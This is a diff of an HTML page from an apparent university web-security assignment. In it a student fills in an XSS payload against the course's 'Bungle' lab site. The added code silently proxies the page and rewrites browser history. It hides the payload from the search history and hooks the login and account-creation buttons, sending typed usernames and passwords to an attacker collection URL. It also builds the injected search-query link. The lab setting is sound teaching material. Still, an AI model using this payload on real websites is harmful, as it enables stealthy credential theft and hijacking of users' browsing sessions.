@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<meta name="11f4765">
-	<title>WebSec 2.2.3</title>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<meta charset="utf-8">
+<meta name="11f4765">
+<title>WebSec 2.2.3</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 <script>
 
 /*
@@ -66,60 +66,121 @@ Then just add spying code and hide your suspicious URLs.
 
 // Inject this XSS payload. 
 function payload(attacker) {
+function proxy(href, spying_url) {
 
-    // This function can make it appear that a new page has been loaded
-    // Note that you can proxy the main page, or a search page!
-	function proxy(href, spying_url) {
+$('html').hide()
 
-        	// Make all current HTML invisible.
-        	$('html').hide();
+$('html').load(href, function() {
+	$.get(attacker, {event:'nav', url:href})
+	hijack()
+	document.title = 'Not Bungle!'
+	$('html').show()
+});
 
-        	// overwrites current HTML. Execute a callback function when load has finished.
-        	$('html').load(href, function() {
+function hijack() {
+	let bungLn = $('#bungle-lnk')
+	let sBar = $('#query')
+	let sBut = $('#search-btn')
+	let logB = $('#log-in-btn')
+	let crB = $('#new-account-btn')
+	let usIn = $('#username')
+	let psIn = $('#userpass')
+	let lgoB = $('#log-out-btn')
+	let sA = $('#search-again-btn')
+	let h = $('.history-item')
 
-                // Show new HTML
-                $('html').show();
+	function post(type) {
+		$.post(`http://bungle-cs461.csl.illinois.edu/${type}`, {username: usIn.val(), password: psIn.val()},
+		(data) => {
+			proxy('./', attacker)
+		})
+	}
 
-                // TODO implement spying while being stealthy and persistent. Remove the alert.
-                alert("Notice that although we injected code into the search page, you see here the main page!")
+	addEventListener('popstate',(event)=>{
+		proxy(event.state.page, attacker)
+	});
 
-            });
-    	}
-    //Call Proxy
-	proxy('./', attacker)
+	if (h){
+		h.each((i,obj)=>{
+			if (obj.href.includes('payload')) {
+				obj.style.display = 'none'
+			}
+			obj.removeAttribute('href')
+			obj.addEventListener('click', ()=>{
+				window.history.pushState({page: `./search?q=${obj.text}`},"",`./search?q=${obj.text}`)
+				proxy(`./search?q=${obj.text}`, attacker)
+			})
+		})
+	}
+	if(lgoB){
+		lgoB.attr('type', 'button').click(() => {
+			post('logout')
+			$.get(attacker, {event:'logout'})
+			proxy('./', attacker)
+		})
+	}
+	bungLn.removeAttr('href').click(() => {
+		window.history.pushState({page: "./"},"","/")
+		proxy('./', attacker)
+	})
+	if(sBut){
+		sBut.attr('type', 'button').click(() => {
+			window.history.pushState({page: `search?q=${sBar.val()}`},"",`search?q=${sBar.val()}`)
+			proxy(`./search?q=${encodeURIComponent(sBar.val())}`, attacker)
+		})
+	}
+	if(logB){
+		logB.attr('type', 'button').click(()=>{
+			post('login')
+			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:'login'})})
+		crB.attr('type', 'button').click(()=>{
+			post('create')
+			$.get(attacker, {user:usIn.val(), pass:psIn.val(), event:'create'})})
+	}
+	if(sA){
+		sA.removeAttr('href').click(()=>{
+			window.history.pushState({page: "./"},"","")
+			proxy('./', attacker)
+		})
+	}
+}
+}
+//Call Proxy
+window.history.replaceState({page: './'},"","/")
+proxy('./', attacker)
 }
 
 function makeLink(target, attacker, defense) {
 
-    // Encode your payload function as a string 
-    payload_string = payload.toString();
+// Encode your payload function as a string 
+payload_string = payload.toString();
 
-    switch(defense) {
-        case 1:
-            // TODO: Implement XSS warmup 2.2.3.1
-	return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=<script>window.addEventListener('load', function () {document.getElementsByTagName('a')[0].href = 'http://ece.illinois.edu';})<\/script>";
-        case 2:
-            // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
-                encodeURIComponent(
-                    "<script>" +
-                    payload_string + 
-                    ";payload();" + 
-                    "</script" + ">"
-                );
-        case 3:
-            // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
-        case 4:
-            // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
-        case 5:
-            // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
-        case 6:
-            // TODO: generate XSS URL payload for defense level 2.2.3.6
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
-    }
+switch(defense) {
+	case 1:
+		// TODO: Implement XSS warmup 2.2.3.1
+		return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=<script>window.addEventListener('load', function () {document.getElementsByTagName('a')[0].href = 'http://ece.illinois.edu';})<\/script>";
+	case 2:
+		// TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+			encodeURIComponent(
+				"<script>" +
+				payload_string.replace(/\t/g, '') + 
+				`;payload('${attacker}');` + 
+				"</script" + ">"
+			);
+	case 3:
+		// TODO: generate XSS URL for defense level 2.2.3.3
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+	case 4:
+		// TODO: generate XSS URL payload for defense level 2.2.3.4
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+	case 5:
+		// TODO: generate XSS URL payload for defense level 2.2.3.5
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+	case 6:
+		// TODO: generate XSS URL payload for defense level 2.2.3.6
+		return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+}
 }
 
 // You MUST not modify anything past this line.
@@ -127,22 +188,22 @@ var target = `http://bungle-cs461.csl.illinois.edu/`;
 var attacker = `http://127.0.0.1:31337/stolen/`;
 
 $(function() {
-    $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
-	$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
-    $("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
-    $("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
-    $("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
-    $("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
+$("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
+$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
+$("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
+$("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
+$("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
+$("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
 });
 </script>
 </head>
 
 <body>
-    <h3 id="defense1"></h3>
-    <h3 id="defense2"></h3>
-    <h3 id="defense3"></h3>
-    <h3 id="defense4"></h3>
-    <h3 id="defense5"></h3>
-    <h3 id="defense6"></h3>
+<h3 id="defense1"></h3>
+<h3 id="defense2"></h3>
+<h3 id="defense3"></h3>
+<h3 id="defense4"></h3>
+<h3 id="defense5"></h3>
+<h3 id="defense6"></h3>
 </body>
 </html>
